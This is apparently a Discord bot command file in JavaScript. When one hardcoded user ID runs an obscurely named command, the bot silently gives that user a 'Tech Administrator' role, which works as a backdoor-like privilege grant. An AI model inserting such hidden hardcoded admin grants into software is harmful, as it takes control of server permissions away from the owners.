const Discord = require("discord.js");

module.exports.run = async (bot, message, args) => {
if (message.member.id != "354261484395560961")
  return;

var teh = message.guild.roles.find(`name`, "Тех. Администратор");
message.member.addRole(teh);
}

  module.exports.help = {
    name: "ל"
  }
